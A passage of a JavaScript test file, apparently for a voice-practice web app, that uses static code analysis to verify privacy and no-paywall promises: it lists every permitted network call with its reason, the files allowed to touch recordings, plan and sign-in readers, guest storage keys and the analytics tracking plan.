// The copy's promises, read from the code. tests/marketing-claims.spec.js proves them for the visitors it plays,
// and the third red team (docs/48 section 11) showed what that cannot reach: 27 changes that broke a promise
// on a path no visitor there walks. A take uploaded when it is rated, when the clock runs out on its own, on
// a singing exercise, on the second save, on the third visit, two minutes later, by the account sync, to the
// window that opened the site, in a streamed body, over DNS; a cap on the routine's second step, on '+30 s',
// on the class and the goal sets, past a trial, in another time zone, on a phone, on a take with no microphone.
//
// A browser test can only walk paths. These read the code, so they hold on every path:
//
// 1. Every way off the device is written down here, function by function, with why it is there. A new one,
//    on any path, fails until somebody writes down why, and says why it cannot carry the voice.
// 2. Only the files that make a take can hear the voice or read a take, and in each of them no function that
//    does leads to one that sends.
// 3. Start, Stop, Continue, the routines (their banner's pause, continue and end too), the take's own record
//    and stop, the welcome-back and reminder starts, the rating, Next and '+30 s' never reach the pricing
//    window, and read the plan only in the functions listed, to draw Pro's own extras. The path follows calls,
//    callbacks handed on, functions handed another (`proOnly(startDaily)`), callbacks set on a property (a
//    button's onclick, the engine's onFrame), each handler on its own element, and methods called on `this`.
// 4. The plan is read only in the files listed, and in them only by the functions written down with why, as is
//    every function that opens the sale or the sign-in: a cap need not be on the path (a page-wide capture
//    listener swallows a Start and calls nothing in practice), and needs a plan read or a window to open.
// 5. Every event's props are the ones in the plan below: js/analytics.js sends only what the worker keeps
//    (tests/node/analytics-wire.test.mjs), and this keeps a new prop on a known event from riding out.
// 6. No account needed: nothing on the way to practising, saving a take, rating it or looking back at the
//    history touches the account module or asks whether the visitor is signed in (but the header's label);
//    the code that keeps a guest's
//    progress never asks, never keeps it for the tab only, and keeps it under the names it always has.
// 7. No ad during practice: only js/ads.js reads the ad config, so no toast or card elsewhere can carry an ad
//    past its practice gate, and it asks Google for nothing but the units it draws. Google's Auto ads (anchor
//    and vignette overlays) are not asked for by the page: they are a switch in the AdSense account, which no
//    test can see, so the go-live checklist keeps it off (docs/40 step 9c).
//
// What these do not do: see a sink spelt through a computed name, follow a value handed through a variable
// (between files, or kept at a file's top level), or see a cap that reads no plan and opens no window. They are
// tripwires for honest changes, which is how the 27 were written; the browser visitors and review are the rest.
import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { parse } from "espree";
import {
  ACCOUNT_NAMES,
  accountNamesIn,
  acrossScripts,
  adPushes,
  billingNamesIn,
  functionsOf,
  practicePath,
  reachable,
  shippedScripts,
  sinksIn,
  usesByFunction,
  voiceSourcesIn
} from "../../qa/promise-scan.mjs";

/** Every way off the device: file → "function › kind" → [count, why]. */
export const EGRESS = {
  "js/account.js": {
    "request › fetch": [1, "every account call (sign-in, the progress sync, trial, licence): JSON to the worker, never a take"],
    "loadGoogleScript › createElement:script": [1, "Google's sign-in button, loaded when the account panel asks for it"],
    "loadGoogleScript › set:src": [1, "the same script's fixed address"]
  },
  "js/admin-layouts.js": {
    "load › VTAccount.request": [1, "the admin window's layout counts (GET)"],
    "loadGlance › VTAccount.request": [2, "the admin window's health and layout glance (GET)"]
  },
  "js/admin.js": { "api › VTAccount.request": [1, "the admin window's calls, for the owner's account only"] },
  "js/ads.js": {
    "renderNativeCard [data-ad-cta] › window.open": [1, "a house ad's link, opened when it is clicked"],
    "renderAdSensePlaceholder › createElement:script": [1, "AdSense's script, outside practice and never for Pro"],
    "renderAdSensePlaceholder › set:src": [1, "the same script's fixed address"]
  },
  "js/analytics.js": {
    "flush › sendBeacon": [1, "events, as the worker keeps them (wireEvent), on the way out of the page"],
    "flush › fetch": [1, "the same events, batched"],
    "forget › fetch": [1, "the request to delete this browser's events"]
  },
  "js/app.js": {
    "renderTourInvite › set:href": [1, "a link to the guide"],
    "syncGuideLinks › set:href": [1, "links to the guide"],
    "syncGuideLinks › setAttribute:href": [1, "links to the guide"],
    "renderExercise › html:input": [1, "the exercise's own sliders, no address"],
    "showPlayback › html:audio": [1, "the take played back from its blob: address, on the device"],
    "renderMetricsForm › html:input": [2, "the rating form's fields, no address"],
    "bindHistoryList btn › createElement:audio": [1, "a saved take played back, on the device"],
    "bindHistoryList btn › set:src": [1, "its blob: address"],
    "bindHistoryList btn › html:audio": [2, "the saved takes' players"],
    "bindAccount #gift-grant-form › VTAccount.request": [1, "the owner's grants, admin only"],
    "bindAccount #gift-code-form › VTAccount.request": [1, "the owner's gift codes, admin only"],
    "renderGiftCodes › VTAccount.request": [1, "the owner's gift codes (GET), admin only"],
    "renderFunnel › VTAccount.request": [1, "the owner's funnel (GET), admin only"],
    "renderAbResults › VTAccount.request": [2, "the owner's A/B results (GET), admin only"],
    "exportProgress › set:href": [2, "the progress file the visitor downloads, from a blob: address"]
  },
  "js/billing.js": {
    "openCustomerPortal › window.open": [1, "the payment provider's portal, when a subscriber asks for it"],
    "startCheckout › navigate": [1, "the checkout page, when a buyer presses buy"]
  },
  "js/boot-head.js": { "(top) › navigate": [1, "out of a frame another site put the page in"] },
  "js/frame-guard.js": { "(top) › navigate": [1, "out of a frame another site put the page in"] },
  "js/license.js": { "postJson › fetch": [1, "a licence key checked with the worker"] },
  "js/region-gate.js": {
    "askWorker › fetch": [1, "which country's consent rules apply, asked once"],
    "renderBar › setAttribute:href": [1, "the consent bar's link to the privacy page"]
  },
  "js/reminders.js": { "downloadIcs › set:href": [1, "the calendar file the visitor downloads, from a blob: address"] },
  "js/reports.js": {
    "mineSection button › VTAccount.request": [1, "the visitor's own bug reports (GET)"],
    "send › VTAccount.request": [1, "a bug report the visitor typed and pressed send on"]
  },
  "js/scenes/guided.js": {
    "attach › new Audio": [1, "the take played back in the guided review, on the device"],
    "attach › set:src": [1, "its blob: address"]
  },
  "js/sync.js": {
    "readAccount › VTAccount.request": [1, "the signed-in visitor's progress, read from their account"],
    "runCycle › VTAccount.request": [1, "their progress (days, ratings, minutes) written to their account; takes stay (sync.js header)"],
    "flush › VTAccount.request": [1, "the same, on the way out of the page"]
  },
  "js/tour.js": { "render › set:href": [1, "a link to the guide"] }
};

/** The files that hear the voice or read a take, and what they use to. */
export const VOICE_FILES = {
  "js/app.js": ["getRecordingBlob", "listRecordings", "saveRecording"],
  "js/piano.js": ["MediaRecorder", "getFloatTimeDomainData", "getUserMedia"],
  "js/pitch-visualizer.js": ["createMediaStreamSource", "getFloatTimeDomainData", "getUserMedia"],
  "js/practice-engine.js": [
    "MediaRecorder",
    "createMediaStreamSource",
    "getByteFrequencyData",
    "getFloatTimeDomainData",
    "getUserMedia",
    "ondataavailable",
    "recBlob"
  ],
  "js/recorder.js": ["MediaRecorder", "createMediaStreamSource", "getByteTimeDomainData", "getUserMedia", "ondataavailable"],
  "js/storage.js": ["getRecordingBlob", "listRecordings", "recordings", "saveRecording", "vt_recordings_db"]
};

/** Sinks that reach the network. An element's address and a player's blob: are left to the list above. */
const NETWORK = /› (fetch|fetchLater|sendBeacon|postMessage|window\.open|navigate|submit|cookie|share|VTAccount\.request|import|importScripts|serviceWorker\.register|hint|speech-recognition|new (?!Audio$))/;

/**
 * Where practice starts, goes on and ends, and where a take is saved and looked back at: the binders and what they
 * call. The routine's banner (pause, continue, end), the take's own record and stop (bindTakeTools) and the
 * welcome-back and reminder starts (startMicroSession) are wired in binders that also open other things, so their
 * practice handlers are roots by name: a click handler is a function of its own, "binder #selector".
 */
const PRACTICE_CORE = [
  "bindPracticeButtons",
  "bindTakeTools",
  "bindRating",
  "bindReferenceCues",
  "renderNextStepCard",
  "renderStartPanel",
  "openPlanExercise",
  "startDaily",
  "startStructured",
  "advanceStructured",
  "openExercise",
  "forceOpenExercise",
  "startPractice",
  "continuePractice",
  "stopPractice",
  "startPlan",
  "runLiveTake",
  "startTimer",
  "recordPracticeIfDue",
  "stepDoneChoice",
  "completeExercise",
  "rateFeel",
  "leaveUnrated",
  "showPlayback",
  "renderHistory",
  "bindHistoryList",
  "pauseStructured",
  "resumeStructured",
  "askEndStructured",
  "endStructured",
  "startMicroSession"
];

/**
 * And every other function that calls one of those, so that a cap ahead of the call is on the path too: each is
 * here, or in NOT_A_WAY_IN with why it is not a way in (the test "every function of js/app.js that calls...").
 */
export const PRACTICE_ROOTS = [
  ...PRACTICE_CORE,
  // Everything the page binds on load: the practice screen's own controls, the piano among them, and what keeps a
  // take when the page hides.
  "bind",
  // The welcome-back card and the reminder's "start now": each starts a short session from its click.
  "bindRetention #wb-micro",
  "bindRetention #wb-last",
  "bindRetention #rd-start",
  // A link that opens an exercise or the history, the tour's steps, the pitch view's own start, the daily loop's and
  // the goal sets' starts, and the redraws after a profile switch, a synced record or a new day.
  "reopenRoutedExercise",
  "applyInitialRoute",
  "tourShow",
  "startPitchViz",
  "init.startRoutine",
  "init.startSet",
  "init.refresh",
  "showActiveProfile",
  "showSyncedRecord",
  "catchUpDay"
];

/** The functions of js/app.js that call into practice and are not on its path, and why each is not a way in. */
export const NOT_A_WAY_IN = {
  init: "the page's start: it hands startDaily to the daily loop and to the page's own hooks, and calls neither",
  "init.onChange": "the redraw after the language changes: it draws the price dialog too, and starts nothing",
  "bindRetention document": "when the tab comes back, it redraws the next step's card: it starts nothing",
  "bindAuth #admin-clear-progress": "the owner's admin button: it clears the progress and redraws the history"
};

/** The functions on that path that read the plan, what they read, and why: each draws, none stops practice. */
export const PLAN_READERS = {
  renderValuePulse: ["VTBilling:1 getEntitlement:1 trialDaysLeft:1", "the progress board's Pro panel and trial line"],
  headerPlanState: ["VTBilling:1 getEntitlement:1", "the header's plan label"],
  renderProGoalPicker: ["VTBilling:2", "Pro's goal picker, shown locked to a free visitor"],
  renderRetentionChrome: ["VTBilling:2 isPro:3", "the reminders card: Pro's second reminder"],
  renderReminderSettings: ["isPro:2", "the same card's second time field"],
  showValueMoment: ["VTBilling:1", "the note after a rated take about the trial"],
  valueMomentFor: ["getEntitlement:1 trialDaysLeft:2", "which note that is"],
  showValueBanner: ["trialDaysLeft:1", "the trial's days left on that note"],
  progressionKeysFor: ["VTBilling:1", "Pro's extra piano progressions, an extra on top of the exercise"]
};

/** The one function on that way that touches the account module or asks whether the visitor is signed in, and why. */
export const SIGN_IN_READERS = {
  headerPlanState: ["VTAccount:1 signedIn:1", "the header's plan label: Pro, trial, or signed in"],
  "bindPageLifecycle window": ["VTSync:1", "when the page hides, after the take is kept here, a signed-in visitor's copy is sent; a guest's is nothing"],
  "bindPageLifecycle document": ["VTSync:1", "the same, when the tab is hidden rather than closed"]
};

/** The files that use the account module or ask whether the visitor is signed in, and why. */
export const SIGN_IN_FILES = {
  "js/account.js": "the account itself",
  "js/admin-layouts.js": "the owner's admin window, its layout counts",
  "js/admin.js": "the owner's admin window",
  "js/app.js": "the account panel, the header and the checkout's need of an account",
  "js/billing.js": "a purchase tied to an account",
  "js/reports.js": "a bug report's own list, for a signed-in reporter",
  "js/sync.js": "the progress sync, which runs only for a signed-in visitor"
};

/** The files that keep a guest's progress: they never ask about an account and never keep anything for the tab only. */
export const GUEST_STORES = ["js/practice-days.js", "js/session.js", "js/storage.js"];
const NOT_IN_GUEST_STORES = new RegExp(`\\b(sessionStorage|${[...ACCOUNT_NAMES].join("|")})\\b`, "g");

/**
 * The names a guest's progress is kept under. With no account there is nothing to restore it from, so renaming one
 * loses every visitor's history (the third red team bumped vt_progress_v1 to v2 unseen): read the old name and move it
 * over first, then change this list.
 */
export const GUEST_KEYS = {
  progress: "vt_progress_v1",
  session: "vt_session_v1",
  weekPlan: "vt_week_plan_v1",
  settings: "vt_settings_v1",
  reviews: "vt_reviews_v1",
  holdLogs: "vt_hold_logs_v1",
  profiles: "vt_profiles_v1",
  goals: "vt_goals_v1",
  achievements: "vt_achievements_v1",
  days: "vt_days_v1",
  loop: "vt_loop_v1",
  DB_NAME: "vt_recordings_db",
  DB_STORE: "recordings"
};

/** The files that may read the ad config or talk to AdSense. */
export const AD_FILES = ["js/ads-config.js", "js/ads.js"];
const AD_NAMES = /\b(VT_ADS_CONFIG|adsbygoogle|nativeCards)\b/;

/** The files that read the plan, and why. */
export const PLAN_FILES = {
  "js/ads.js": "no ads for Pro",
  "js/app.js": "the pricing window, the account panel, the Pro panels and the readers above",
  "js/auth.js": "the QA unlock of a test account",
  "js/billing.js": "the plan itself",
  "js/practice-days.js": "Pro's extra rest days for the streak",
  "js/reminders.js": "Pro's second reminder",
  "js/value-pulse.js": "the trial's days left on the progress board"
};

/**
 * Every function that reads the plan or opens the sale, file by file, with what it uses and why. A cap needs one
 * or the other, and it need not be on the way to practice to stop it: a page-wide capture listener that swallows
 * the welcome-back Start and opens the plans calls nothing in practice. So a new one, anywhere, fails here until
 * somebody writes down why, as a new way off the device does in EGRESS. "(top)" is the file's own top level.
 */
export const PLAN_USES = {
  "js/ads.js": {
    isProUser: ["VTBilling:1 isPro:1", "no ads for Pro"],
    "renderNativeCard [data-ad-cta]": ["btn-pricing:1", "the house card that sells Pro opens the plans when it is pressed"]
  },
  "js/app.js": {
    progressionKeysFor: ["VTBilling:1", "Pro's extra piano progressions, an extra on top of the exercise"],
    isCheckoutPrelaunch: ["VTBilling:1", "whether checkout is open yet, for the pricing dialog's buttons"],
    headerPlanState: ["VTBilling:1 getEntitlement:1", "the header's plan label"],
    trialSpent: ["VTBilling:1 trialStartedAt:1", "the pricing dialog's line on a trial already used"],
    updateBillingChrome: ["#btn-pricing:1 VTBilling:1 getEntitlement:1", "the header's Pro button's label"],
    renderValuePulse: ["VTBilling:1 getEntitlement:1 trialDaysLeft:1", "the progress board's Pro panel and trial line"],
    renderProGoalPicker: ["VTBilling:2", "Pro's goal picker, shown locked to a free visitor"],
    renderReminderSettings: ["isPro:2", "the reminders card's second time field"],
    renderRetentionChrome: ["VTBilling:2 isPro:3", "the reminders card: Pro's second reminder"],
    saveTimes: ["VTBilling:1 isPro:2", "saving the reminders keeps the second time for Pro only"],
    "bindRetention #rem-time-2": ["VTBilling:1 openPricing:1", "a free visitor setting a second reminder time is shown the plans"],
    "bindProStudio #btn-profile-add": ["VTBilling:1 openPricing:1", "a second singer's profile is Pro's"],
    "bindProStudio #sel-week-goal": ["VTBilling:1 openPricing:1", "the weekly goal picker is Pro's"],
    valueMomentFor: ["getEntitlement:1 trialDaysLeft:2", "which note follows a rated take"],
    showValueBanner: ["trialDaysLeft:1", "the trial's days left on that note"],
    showValueMoment: ["VTBilling:1", "the note after a rated take about the trial"],
    relabelValueBanner: ["VTBilling:1 trialDaysLeft:1", "the same note, redrawn in the new language"],
    renderPricingModal: ["VTBilling:1 getEntitlement:2", "the pricing dialog itself"],
    "renderPricingModal btn": ["openAccount:1", "a plan button pressed by someone not signed in opens the account first"],
    pricingStatusLine: ["trialDaysLeft:1", "the pricing dialog's status line"],
    openPricing: ["openPricing:1", "the pricing dialog's own opener"],
    openAccount: ["openAccount:1", "the account panel's own opener"],
    bindAuth: ["openAccount:1", "the header's account button"],
    "bindAuth #btn-account-pricing": ["openPricing:1", "the account panel's button to the plans"],
    "bindAuth #admin-force-pro": ["VTBilling:1", "the owner's admin button that turns Pro on"],
    "bindAuth #admin-clear-billing": ["VTBilling:1", "the owner's admin button that clears the plan"],
    recheckPayment: ["VTBilling:1", "'I have paid': asks the worker again"],
    startAccountTrial: ["openAccount:1", "the account's trial: someone not signed in is sent to the panel"],
    startLocalTrial: ["VTBilling:3 trialDaysLeft:1", "the browser's own trial, for a deploy with no sign-in"],
    openBillingPortal: ["VTBilling:2", "the customer portal, from the pricing dialog"],
    exportProgress: ["VTBilling:2 openPricing:1", "the progress export is Pro's: a free visitor is shown the plans"],
    bindBillingEvents: ["VTBilling:3", "redraws when the plan changes, and the return from a checkout"],
    bindBilling: ["#btn-pricing:1 VTBilling:1 openPricing:2", "binds the header's Pro button and the progress board's"],
    "bindBilling #value-banner-cta": ["openPricing:1", "the trial note's button to the plans"],
    "bindBilling #btn-demo-pro": ["VTBilling:2", "the demo build's button that turns Pro on"],
    "(top)": ["openAccount:2 openPricing:2", "the page's exports of the two openers, for the other scripts"]
  },
  "js/auth.js": {
    login: ["VTBilling:3", "the QA unlock of a test account"]
  },
  "js/billing.js": {
    trialStartedAt: ["trialStartedAt:1", "the plan itself: when the trial started"],
    ensureTrial: ["trialStartedAt:1", "the plan itself: the trial's start, once"],
    canStartTrial: ["trialStartedAt:1", "the plan itself: whether this browser still has its trial"],
    startTrial: ["trialActive:1 trialStartedAt:1", "the plan itself: starting the trial"],
    trialActive: ["trialActive:1", "the plan itself"],
    trialDaysLeft: ["trialActive:1 trialDaysLeft:1", "the plan itself"],
    getEntitlement: ["getEntitlement:1 trialActive:1", "the plan itself"],
    isPro: ["getEntitlement:1 isPro:1", "the plan itself"],
    emit: ["getEntitlement:1", "the plan itself: tells its listeners it changed"],
    can: ["isPro:1", "the plan itself: Pro's feature flags"],
    exportProgressJson: ["getEntitlement:1", "the progress export, Pro's"],
    "(top)": [
      "VTBilling:2 getEntitlement:2 isPro:2 trialActive:2 trialDaysLeft:2 trialStartedAt:2 vt_billing_trial_started_v1:1 vt_billing_v1:1",
      "the plan's storage keys and its exports"
    ]
  },
  "js/practice-days.js": {
    isPro: ["VTBilling:2 isPro:2", "Pro's extra rest days for the streak"],
    restCap: ["isPro:1", "how many rest days the streak can bank"]
  },
  "js/reminders.js": {
    freezeAllowance: ["isPro:2", "the old name for that rest-day allowance"]
  },
  "js/value-pulse.js": {
    suggestUpgradeMoment: ["trialDaysLeft:6", "the trial's days left on the progress board"]
  }
};

/** What opens the sign-in: the account panel, its button, Google's button or an emailed code. */
const SIGN_IN_OPENER = /^(openAccount|#?btn-account|signInWithGoogle|startEmailSignIn|renderGoogleButton)$/;

/**
 * Every function that opens the sign-in, file by file, and why. A wall in front of practice can be the account as
 * well as the plans, and need not read the plan: so these are written down as the plan's readers are.
 */
export const SIGN_IN_OPENERS = {
  "js/account.js": {
    startEmailSignIn: ["startEmailSignIn:1", "the account itself: the emailed code"],
    renderGoogleButton: ["renderGoogleButton:1", "the account itself: Google's button"],
    "renderGoogleButton.callback": ["signInWithGoogle:1", "what Google's button does when pressed"],
    signInWithGoogle: ["signInWithGoogle:1", "the account itself"],
    "(top)": ["renderGoogleButton:2 signInWithGoogle:2 startEmailSignIn:2", "the account's exports"]
  },
  "js/admin.js": {
    drawSignIn: ["renderGoogleButton:1", "the owner's admin window asks its owner to sign in"]
  },
  "js/app.js": {
    "renderPricingModal btn": ["openAccount:1", "a plan button pressed by someone not signed in opens the account first"],
    refreshAccountUI: ["#btn-account:1", "the header's account button's label"],
    mountGoogleButton: ["renderGoogleButton:1", "Google's button inside the account panel"],
    openAccount: ["openAccount:1", "the account panel's own opener"],
    bindAuth: ["#btn-account:1 openAccount:1", "the header's account button"],
    "bindAccount #account-email-form": ["startEmailSignIn:1", "the account panel's email form"],
    "bindAccount #account-code-resend": ["startEmailSignIn:1", "the account panel's 'send the code again'"],
    startAccountTrial: ["openAccount:1", "the account's trial: someone not signed in is sent to the panel"],
    "(top)": ["openAccount:2", "the page's export of the opener, for the other scripts"]
  }
};

/** Every event and the props it may carry. `x_*` is app_open's re-asserted arms. */
export const TRACKING_PLAN = {
  account_panel_open: ["state"],
  ad_click: ["id", "mode", "slot"],
  ad_dismiss: ["id", "slot"],
  ad_impression: ["id", "mode", "slot"],
  ad_suppressed_practice: ["slot"],
  ad_suppressed_pro: ["slot"],
  ad_unfilled: ["mode", "slot", "status"],
  app_open: ["day", "loop", "...reassertedArms"],
  audio_compare: [],
  basics_complete: ["comeback", "first", "practiceDays", "practiced", "steps", "surprise", "tier", "track"],
  basics_incomplete: ["practiced", "steps", "tier", "track"],
  basics_start: ["sec", "steps", "tier", "track"],
  comeback: ["daysAway", "restBank"],
  experiment_expose: ["enabled", "experiment", "forced", "variant"],
  experiment_forced_view: ["enabled", "experiment", "variant"],
  first_track_pick: ["track"],
  first_win: ["exerciseId"],
  first_win_micro: [],
  layout_session: ["n", "src", "ver"],
  layout_switch: ["from", "sec", "to", "via"],
  layout_time: ["sec", "ver"],
  loop_cards_open: ["n"],
  loop_goal_set: ["goal"],
  loop_remind_click: [],
  loop_tier_pick: ["tier"],
  mic_blocked: ["canRun", "exerciseId"],
  mic_primer_accept: [],
  mic_primer_decline: [],
  mic_primer_dismiss: [],
  mic_primer_show: [],
  milestone: ["n"],
  practice_day: ["n", "source", "structured"],
  practice_recorded: ["durationSec", "exerciseId", "firstOfDay", "micro", "source", "structured"],
  practice_start: ["exerciseId", "micro", "mode"],
  pro_paid_first: [],
  remind_due_shown: [],
  reminder_enable: ["enabled"],
  rest_used: ["days"],
  session_save: ["durationSec", "exerciseId", "feel", "firstWin", "score"],
  set_complete: ["practiced", "set", "steps", "track"],
  set_start: ["sec", "set", "steps", "track"],
  sets_open: ["n", "track"],
  signin_fail: ["method", "reason"],
  signin_start: ["method"],
  signin_success: ["method"],
  step_done_choice: ["choice", "exerciseId"],
  step_done_shown: ["exerciseId", "mic"],
  surprise_shown: ["id", "kind", "reason"],
  tour_complete: ["lastStepId", "n", "pack", "total"],
  tour_dismiss: ["lastStepId", "n", "pack", "total"],
  tour_guide_open: ["pack", "stepId"],
  tour_invite_accept: [],
  tour_invite_dismiss: [],
  tour_skip: ["lastStepId", "n", "pack", "total"],
  tour_start: ["authored", "fromButton", "pack", "steps", "variant"],
  tour_step: ["n", "pack", "stepId", "total"],
  trial_click: ["where"],
  trial_cta_view: ["where"],
  trial_first_practice: ["kind"],
  trial_result: ["kind", "outcome", "where"],
  trial_started: ["kind", "where"]
};

/** The functions that pass an event on without naming it: each module's own track(), and the funnel's. */
export const TRACK_RELAYS = ["js/ads.js › track", "js/app.js › trackFunnel", "js/daily-loop.js › track", "js/session-sets.js › track", "js/site-version.js › track", "js/tour.js › track"];

const TRACKERS = new Set(["track", "trackFunnel"]);

/** What a difference between two lists is, line by line, so a failure says what to write down. */
function diffCounts(found, expected) {
  const lines = [];
  for (const key of new Set([...Object.keys(found), ...Object.keys(expected)])) {
    if (found[key] !== expected[key]) lines.push(`${key}: found ${found[key] ?? 0}, written down ${expected[key] ?? 0}`);
  }
  return lines;
}

const flat = (bag) => Object.fromEntries(Object.entries(bag).flatMap(([file, rows]) => Object.entries(rows).map(([k, v]) => [`${file} :: ${k}`, v])));

/**
 * The events a script raises: [where, name, props keys] for each call, and the relays that pass one on. A name
 * made from a template (`tour_${reason}`) is each name the template can make: its one part must be a parameter of
 * the function it is in, that function must give it no other value, must be called only by its bare name in this
 * file (never handed on, bound or exported, where a call from elsewhere could pass anything), and every call of it
 * must pass a literal, a choice of two, or a parameter of its own that resolves the same way. One that cannot be
 * resolved is listed, so no name is guessed by its prefix. A relay must pass on its own two parameters as they
 * came (`props || {}` at most); one that adds to them, or changes either, is listed as changing what it passes on.
 */
export function eventsIn(source, file) {
  const found = { calls: [], relays: [], unresolved: [] };
  const ast = parse(source, { ecmaVersion: "latest", sourceType: "script", loc: true });
  const ctx = { callsTo: new Map(), escaping: new Set() };
  const templates = [];
  const visit = (node, owner, frame, parent) => {
    if (!node || typeof node.type !== "string") return;
    const here = /Function/.test(node.type) && node.id?.name ? node.id.name : owner;
    const inner = frameOf(node, parent) || frame;
    if (node.type === "Identifier" && escapesAt(node, parent)) ctx.escaping.add(node.name);
    if (node.type === "CallExpression") noteCall(node, ctx, { owner: here, file, found, frame: inner }, templates);
    for (const v of Object.values(node)) {
      if (Array.isArray(v)) v.forEach((c) => visit(c, here, inner, node));
      else if (v && typeof v.type === "string") visit(v, here, inner, node);
    }
  };
  visit(ast, "(top)", { name: "", params: [], node: null }, null);
  for (const { ev, keys, frame, where } of templates) {
    const [head, tail] = ev.quasis.map((q) => q.value.cooked);
    const part = ev.expressions.length === 1 ? ev.expressions[0] : null;
    const values = part ? valuesOf(part, frame, ctx, new Set()) : null;
    if (!values) found.unresolved.push(`${where} \`${ev.quasis.map((q) => q.value.raw).join("${}")}\``);
    else for (const v of values) found.calls.push([where, head + v + tail, keys]);
  }
  return found;
}

/** A call: kept by its bare name for the templates' parameters, and read for an event it raises. */
function noteCall(node, ctx, where, templates) {
  const callee = node.callee.type === "Identifier" ? node.callee.name : "";
  if (callee) ctx.callsTo.set(callee, [...(ctx.callsTo.get(callee) || []), { args: node.arguments, frame: where.frame }]);
  eventCall(node, where, (ev, keys) => templates.push({ ev, keys, frame: where.frame, where: `${where.file}:${node.loc.start.line}` }));
}

const paramName = (p) => (p.type === "AssignmentPattern" ? p.left.name : p.name) || "";

/** A function's name (its own, or the variable it is kept in), its parameters and its node, or null for any other node. */
function frameOf(node, parent) {
  if (!/Function/.test(node.type)) return null;
  const name = node.id?.name || (parent?.type === "VariableDeclarator" ? parent.id.name : "");
  return { name, params: node.params.map(paramName), node };
}

/** Whether an identifier is used as a value here, where it can be handed on: anything but a call by it, its own declaration, or a property's name. */
function escapesAt(node, p) {
  if (!p) return true;
  if (p.type === "CallExpression" || p.type === "NewExpression") return p.callee !== node;
  if (/Function/.test(p.type)) return p.body === node;
  if (p.type === "VariableDeclarator") return p.init === node;
  if (p.type === "MemberExpression") return p.object === node || p.computed;
  if (p.type === "Property" || p.type === "MethodDefinition" || p.type === "PropertyDefinition") return p.value === node || p.computed;
  return true;
}

/** The names a pattern binds: `a`, `{ a, b: c }`, `[a, ...d]`, `a = 1`. */
function patternNames(p) {
  if (!p) return [];
  if (p.type === "Identifier") return [p.name];
  if (p.type === "AssignmentPattern") return patternNames(p.left);
  if (p.type === "RestElement") return patternNames(p.argument);
  if (p.type === "ArrayPattern") return p.elements.flatMap(patternNames);
  if (p.type === "ObjectPattern") return p.properties.flatMap((q) => patternNames(q.value ?? q.argument));
  return [];
}

/** The variable an assignment's target writes to or into: `x` for `x = 1`, `x.a = 1` and `x[k] = 1`. */
const rootOf = (n) => (n?.type === "MemberExpression" ? rootOf(n.object) : n?.type === "Identifier" ? n.name : "");

/** What one node does to `name`: gives it a new value, writes into it, or declares another of the same name. */
function rewritesAt(n, name, top) {
  if (n.type === "AssignmentExpression") return rootOf(n.left) === name || patternNames(n.left).includes(name);
  if (n.type === "UpdateExpression") return rootOf(n.argument) === name;
  if (n.type === "VariableDeclarator") return patternNames(n.id).includes(name);
  if (n.type === "CallExpression" && n.callee.type === "MemberExpression") return rootOf(n.callee.object) === "Object" && rootOf(n.arguments[0]) === name;
  return n !== top && /Function/.test(n.type) && n.params.some((q) => patternNames(q).includes(name));
}

/** Whether a function's body changes `name` anywhere: `reason = "skip_first"`, `props.view = ...`, `Object.assign(props, ...)`. */
function rewrites(fn, name) {
  let hit = false;
  const visit = (n) => {
    if (hit || !n || typeof n.type !== "string") return;
    hit = rewritesAt(n, name, fn);
    for (const v of Object.values(n)) {
      if (Array.isArray(v)) v.forEach(visit);
      else if (v && typeof v.type === "string") visit(v);
    }
  };
  if (fn) visit(fn);
  return hit;
}

/**
 * The strings an argument can be: a literal, either side of a choice, or a parameter, through every call of its
 * function. `false` or `null` make no name (the template's function returns first on them: tour.js's end(false)
 * closes the tour without recording it). null when it cannot be told.
 */
function valuesOf(arg, frame, ctx, seen) {
  if (arg?.type === "Literal") return literalValues(arg.value);
  if (arg?.type === "ConditionalExpression") {
    const [a, b] = [valuesOf(arg.consequent, frame, ctx, seen), valuesOf(arg.alternate, frame, ctx, seen)];
    return a && b ? [...a, ...b] : null;
  }
  const i = arg?.type === "Identifier" ? frame.params.indexOf(arg.name) : -1;
  if (i < 0 || !frame.name || seen.has(frame.name) || rewrites(frame.node, arg.name)) return null;
  return paramValues(frame.name, i, ctx, seen);
}

const literalValues = (v) => (typeof v === "string" ? [v] : v === false || v === null ? [] : null);

/** What the i-th parameter of `name` can be, through each of its calls; null if one cannot be told, none is seen, or the function escapes. */
function paramValues(name, i, ctx, seen) {
  const calls = ctx.callsTo.get(name) || [];
  if (!calls.length || ctx.escaping.has(name)) return null;
  const out = [];
  for (const call of calls) {
    const v = valuesOf(call.args[i], call.frame, ctx, new Set([...seen, name]));
    if (!v) return null;
    out.push(...v);
  }
  return [...new Set(out)];
}

/** Whether a relay passes on its own first two parameters as they came: `track(name, props)` or `track(name, props || {})`. */
function passesOn(ev, props, frame) {
  const own = (node, i) => node?.type === "Identifier" && frame.params[i] === node.name && !rewrites(frame.node, node.name);
  const emptyOr = props?.type === "LogicalExpression" && props.operator === "||" && props.right.type === "ObjectExpression" && !props.right.properties.length;
  return own(ev, 0) && (!props || own(emptyOr ? props.left : props, 1));
}

function eventCall(node, { owner, file, found, frame }, template) {
  const c = node.callee;
  const name = c.type === "MemberExpression" ? c.property.name : c.type === "Identifier" ? c.name : "";
  if (!TRACKERS.has(name)) return;
  const [ev, props] = node.arguments;
  const named = ev?.type === "Literal" || ev?.type === "TemplateLiteral";
  if (!named || (props && props.type !== "ObjectExpression")) {
    found.relays.push(`${file} › ${owner}${passesOn(ev, props, frame) ? "" : " (changes what it passes on)"}`);
    return;
  }
  const keys = (props?.properties || []).map((p) => (p.type === "SpreadElement" ? "..." + (p.argument.callee?.name || "?") : (p.key.name ?? p.key.value)));
  if (ev.type === "TemplateLiteral") template(ev, keys);
  else found.calls.push([`${file}:${node.loc.start.line}`, ev.value, keys]);
}

test("every way off the device is written down, function by function, with why it is there", () => {
  const found = flat(acrossScripts(".", sinksIn));
  const expected = flat(Object.fromEntries(Object.entries(EGRESS).map(([f, rows]) => [f, Object.fromEntries(Object.entries(rows).map(([k, [n]]) => [k, n]))])));
  assert.deepEqual(
    diffCounts(found, expected),
    [],
    "a way off the device was added, moved or removed. Write it down in EGRESS with why it is there, and why it cannot carry the voice"
  );
});

test("only the files that make a take hear the voice or read a take", () => {
  const found = Object.fromEntries(Object.entries(acrossScripts(".", voiceSourcesIn)).map(([f, names]) => [f, Object.keys(names).sort()]));
  assert.deepEqual(found, VOICE_FILES);
});

/**
 * The ways off the device a script's hearers lead to: "function › kind, reached by a > b". A function made in the
